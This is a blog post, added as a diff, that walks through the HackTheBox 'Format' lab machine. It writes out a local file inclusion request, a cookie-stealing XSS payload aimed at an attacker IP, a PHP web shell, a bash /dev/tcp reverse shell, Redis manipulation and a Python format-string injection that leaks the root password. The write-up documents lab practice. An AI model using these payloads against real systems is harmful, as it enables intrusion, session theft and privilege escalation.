@@ -1,0 +1,270 @@
+---
+layout: post
+title:  "Writeup of Format (HackTheBox)"
+date:   2023-11-18 18:06:00 +0000
+categories: hackthebox
+author: brun0ne
+tags: htb hackthebox format nginx
+---
+
+# Discovery
+
+There is a domain `microblog.htb`.
+
+`.\ffuf.exe -w .\subdomains-top1million-20000.txt -u http://10.10.11.213 -H 'Host: FUZZ.microblog.htb'`
+
+```
+app.microblog.htb
+sunny.microblog.htb
+```
+
+`microblog.htb:3000` hosts **Gitea** (needs creds).
+
+`app.microblog.htb` hosts **Microblog** (blog creation app).
+
+`sunny.microblog.htb` hosts some website/blog.
+
+`microblog.htb` gives **nginx/1.18.0 404**.
+
+# Gitea
+
+Checking **/explore/repos**:
+
+**There is a repo** `cooper/microblog`.
+
+It has the source code of both **app** and **sunny**.
+
+# Sunny
+
+`/content/order.txt`:
+
+```
+2766wxkoacy
+jtdpx1iea5
+rle1v1hnms
+syubx3wiu3e
+```
+
+It seems to be a list of all the files inside **/content/** from which the website is composed.
+
+`/edit/index.php` redirects to `/`.
+
+# App
+
+We can register and create a blog.
+
+The **"Visit Site"** button takes us to a new domain - `<blogname>.microblog.htb`.
+
+When we visit the blog, it sees the cookie and has a banner saying:
+
+```
+Test, this is your blog! Edit it here.
+```
+
+Editing redirects to `<blogname>.microblog.htb/edit/`
+
+We can put **arbitrary JS** there and it executes after visiting the blog - XSS?
+
+#
+
+We can look at **sunny**'s `/edit/` source to see how it works.
+
+```php
+if(file_exists("bulletproof.php")) {
+    require_once "bulletproof.php";
+}
+```
+
+It's using **bulletproof.php 4.0.0** which is probably not safe - but to upload files, we need to be a **pro** user:
+
+```php
+//add image
+if (isset($_FILES['image']) && isset($_POST['id'])) {
+    if(isPro() === "false") {
+        print_r("Pro subscription required to upload images");
+        header("Location: /edit?message=Pro subscription required&status=fail");
+        exit();
+    }
+```
+
+`/register/`:
+
+```php
+$redis->HSET(trim($_POST['username']), "pro", "false"); //not ready yet, license keys coming soon
+```
+
+To become a pro user, we can try to edit **sunny** and put an XSS there.
+
+# LFI
+
+```
+POST /edit/index.php
+
+id=../../../../../etc/passwd&header=
+```
+
+- `/etc/passwd`
+
+```
+cooper:x:1000:1000::/home/cooper
+```
+
+# XSS on sunny
+
+We can overwrite **sunny**'s content, for example:
+
+`id=/var/www/microblog/sunny/content/jtdpx1iea5&header=x`
+
+Let's try **XSS** to steal admin's session cookie:
+
+`id=/var/www/microblog/sunny/content/jtdpx1iea5&header=<script>window.location="http://10.10.14.93/?" + document.cookie;</script>`
+
+Unfortunately we never get a callback.
+
+# Writing to the socket
+It might be possible to directly communicate with Redis by writing to the `/var/run/redis/redis.sock`.
+
+`id=/var/run/redis/redis.sock&header=%0D%0A%0D%0AHSET+test+pro+"true"%0D%0A%0D%0A`
+
+Nothing worked so far.
+
+# Config enumeration
+
+```
+/etc/nginx/nginx.conf
+/var/log/nginx/error.log
+/var/log/nginx/access.log
+/etc/nginx/fastcgi.conf
+/etc/nginx/fastcgi_params
+/etc/nginx/mime.types
+/etc/nginx/sites-enabled/default
+/etc/nginx/sites-enabled/microblog.htb
+/etc/php/7.4/fpm/php.ini
+```
+
+# PHP execution
+
+Let's look at: https://www.sitepoint.com/setting-up-php-behind-nginx-with-fastcgi/
+
+Inside php.ini there's a line:
+
+```
+cgi.fix_pathinfo=1;
+```
+
+[It's dangerous!](https://security.stackexchange.com/questions/177354/turned-on-cgi-fix-pathinfo-still-dangerous-in-nginx)
+
+We can do a `POST /edit/index.php` with:
+
+```php
+id=cos.php&header=<?php phpinfo(); ?>
+```
+
+**It works!**
+
+Let's try command execution:
+
+`id=cos.php&header=<?php echo(shell_exec($_GET['cmd'])); ?>`
+
+Now we can execute a command:
+
+`GET /content/cos.php/cos.php?cmd=id`
+
+```
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+Now a reverse shell (url-encoded):
+
+`GET /content/cos.php/cos.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.117/9001 0>&1'`
+
+**Done!**
+
+# Shell as www-data
+
+We can become a **pro** user:
+
+`redis-cli -s /var/run/redis/redis.sock`
+
+`HSET test pro "true"`
+
+**Enumerating more:**
+
+`keys *`
+
+```
+1) "PHPREDIS_SESSION:21f8mbj2edv01rl0d4fqb6faa7"
+2) "test"
+3) "cooper.dooper:sites"
+4) "test:sites"
+5) "cooper.dooper"
+```
+
+`HGET cooper.dooper password`
+
+```
+zooperdoopercooper
+```
+
+# SSH - cooper
+
+**cooper:zooperdoopercooper** works for SSH!
+
+`user.txt: <redacted>`
+
+#
+
+LinPeas output inside [scan.out](scan.out).
+
+`sudo -l`
+
+```
+Matching Defaults entries for cooper on format:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User cooper may run the following commands on format:
+    (root) /usr/bin/license
+```
+
+`file /usr/bin/license`
+
+```
+/usr/bin/license: Python script, ASCII text executable
+```
+
+We can read the script: [license.py](license.py).
+
+`sudo /usr/bin/license -p test`
+
+```
+Plaintext license key:
+------------------------------------------------------
+microblogtest'|*;BsA%&sJaJ81KL4%8{(U&n$a$uX%ctK2fh{=0testtest
+
+Encrypted license key (distribute to customer):
+------------------------------------------------------
+gAAAAABkkfUwoteDzgaLd8-mOJm5xrLhLvEBjlBEKwAtF_qSw-vJNLy0B8wUeb_BcffTmcuTKgRMoAZWoTvxbc_yldDLzCwtbQalLXY1QdzhjBBnLyhiW22i4M7qbAWxVQJt6TMfjZxNuKG_ZbQNnx9oB_j5qauAaw==
+```
+
+Wrote [bruteforce_secret.py](bruteforce_secret.py) to try throwing rockyou.txt at it, but it didn't crack.
+
+#
+
+This line seems vulnerable to a format string injection:
+
+```python
+license_key = (prefix + username + "{license.license}" + firstlast).format(license=l)
+```
+
+1. Inside redis run: `HSET test first-name {"license.__init__.__globals__[secret]}"`
+2. Run: `sudo /usr/bin/license -p test`
+
+```
+Plaintext license key:
+------------------------------------------------------
+microblogtest2vUtjYfHe-@?AO;1HB/0a{Bf`P+b_Y#EG_x-(pQnCunCR4ckaBL3Pa$$w0rdtest
+```
+
+So let's try `su -` with **unCR4ckaBL3Pa$$w0rd** - works!
+
+`root.txt: <redacted>`
